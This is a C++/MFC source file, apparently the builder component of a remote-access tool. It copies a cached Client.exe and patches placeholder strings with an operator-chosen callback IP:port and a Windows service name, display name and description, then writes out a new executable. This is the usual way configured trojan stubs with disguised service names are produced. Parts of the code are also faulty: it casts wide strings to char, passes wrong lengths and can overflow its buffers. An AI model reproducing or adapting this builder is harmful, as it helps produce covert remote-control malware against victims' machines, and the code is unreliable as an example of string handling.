// Build.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "Build.h"
#include "afxdialogex.h"


// CBuild 对话框

IMPLEMENT_DYNAMIC(CBuild, CDialogEx)

CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialogEx(CBuild::IDD, pParent)
	, m_port(0)
{

}

CBuild::~CBuild()
{
}

void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_BUILD_PORT, m_port);
}


BEGIN_MESSAGE_MAP(CBuild, CDialogEx)
	ON_BN_CLICKED(IDOK, &CBuild::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuild 消息处理程序

bool CBuild::CheckInput()
{
	return true;
}

void CBuild::WriteInfoToFile()
{

}
void CBuild::OnBnClickedOk()
{
	// TODO:  在此添加控件通知处理程序代码
	//CDialogEx::OnOK();
	if (CheckInput() == false)
	{
		return;
	}
	else
	{
		CFileDialog dlg(FALSE, _T("exe"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, _T("可执行文件|*.exe||"), this);
		wchar_t path[260];
		if (dlg.DoModal() == IDOK)
		{
			CString t;
			t = dlg.GetPathName();
			wcscpy_s(path, CT2CW(t));
		}
		else
		{
			return;
		}
		WriteInfoToFile();

		FileToMem(_T(".\\Cache\\Client.exe"));
		//复制连接域名
		wchar_t wIP[160];
	    GetDlgItem(IDC_BULID_IP)->GetWindowTextW(wIP, _countof(wIP));
		char Info[100];
		CStringToChar(wIP, Info);
		strcat_s(Info, sizeof(Info), ":");
		//复制连接端口
		char Port[10];
		_itoa_s(m_port, Port, 10);
		strcat_s(Info, sizeof(Info), Port);

		//写入配置字符串
		char OldInfo[] = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU";
		UpdateString(OldInfo, Info, sizeof(OldInfo), sizeof(Info));

		char ServiceName[220] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
		char ShowName[220] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
		char Description[220] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

		wchar_t wServiceName[110];
		GetDlgItem(IDC_BUILD_SERVERNAE)->GetWindowTextW(wServiceName, _countof(wServiceName));
		UpdateString(ServiceName, (char*)wServiceName, sizeof(ServiceName), sizeof(Info));

		wchar_t wShowName[110];
		GetDlgItem(IDC_BUILD_SHOWNAME)->GetWindowTextW(wShowName, _countof(wShowName));
		UpdateString(ShowName, (char*)wShowName, sizeof(ShowName), sizeof(wShowName));

		wchar_t wDescription[110];
		GetDlgItem(IDC_BUILD_DESPCRIPTION)->GetWindowTextW(wDescription, _countof(wDescription));
		UpdateString(Description, (char*)wDescription, sizeof(Description), sizeof(wDescription));

		MemToFile(path);
	}
}

void CBuild::FileToMem(wchar_t* pOldFilePathName)
{
	this->d_FileSize = 0;
	if (!m_File.Open(pOldFilePathName, CFile::modeRead))
	{
		MessageBox(_T("无法载入配置文件"), _T("提示"), MB_OK | MB_ICONWARNING);
		return;
	}
	//得到原文件大小   
	d_FileSize = m_File.GetLength();

	//读取原文件
	//BYTE* pFileData = NULL;
	this->pFileData = NULL;
	this->pFileData = new BYTE[(UINT)d_FileSize];
	m_File.Read(this->pFileData, (UINT)d_FileSize);
	m_File.Close();
}

void CBuild::UpdateString(char *pOldStr, char *pNewStr, int stroldlen, int strnewlen)  //这里用模式匹配算法优化
{
	int count = 0;
	//用于记录新字符串与原文字符串相同的次数
	int sameNumber = 0;

	for (DWORD i = 0; i<this->d_FileSize; i++)
	{
		//如果记录BYTE相同的次数与新字符串长度相同则更改内存中的数据
		if (count == stroldlen)
		{
			//先把原文件的指针移动到第一个BYTE相同的地方
			pFileData -= count;

			//循环更改内存数据
			int j;
			for (j = 0; j<strnewlen; j++)
			{
				*pFileData = *pNewStr;
				pFileData++;
				pNewStr++;
			}

			//内存更改完毕后，新字符串的指针应回到开始的地方
			pNewStr -= j;

			//旧字符串的指针应回到开始的地方
			pOldStr -= count;

			//原文件的指针也应该回到刚才比较的地方
			pFileData += count - j;

			//一次字符串更改完毕了，置0
			count = 0;

			//更改的次数加1
			sameNumber++;
		}

		//如果原文的BYTE与旧字符串的BYTE相同，则count加1，旧字符串指针指向下一个BYTE
		if (*pFileData == *pOldStr)
		{
			count++;
			pOldStr++;
		}
		else
		{   //否则就是不相同，这时旧字符串指针要回到开始处，count置0
			pOldStr -= count;
			count = 0;
		}

		//循环完成，指针指向原文下一个BYTE
		pFileData++;
	}

	if (sameNumber == 0)
	{
		MessageBoxW(_T("配置信息写入失败"), _T("提示"), MB_OK | MB_ICONWARNING);
		return;
	}

	//整个比较过程结束，此时已完成读入内存数据的修改工作
	//创建新的文件，将修改过的内存数据写入新的文件
	//记得将原文件内存中的指针重新指向开始的地方，因为后面写文件时会用到这个指针
	pFileData -= d_FileSize;
}

void CBuild::MemToFile(wchar_t* pNewFilePathName)
{
	if (!m_File.Open(pNewFilePathName, CFile::modeCreate | CFile::modeWrite))
	{
		delete[] pFileData;
		MessageBox(_T("生成文件失败"), _T("错误"), MB_OK | MB_ICONWARNING);
		return;
	}
	//这时就可以写文件啦
	m_File.Write(pFileData, (UINT)d_FileSize);
	m_File.Close();
	//别忘了清理垃圾
	delete[] pFileData;

	//OK，大功告成了
}

void CBuild::CStringToChar(CString str, char* w)
{
	int len = WideCharToMultiByte(CP_ACP, 0, str, str.GetLength(), NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, str, str.GetLength(), w, len, NULL, NULL);
	w[len] = '\0';
}
void CBuild::CStringToChar(wchar_t *wIP, char *Info)
{
	CString temp(wIP);
	this->CStringToChar(temp, Info);
	
}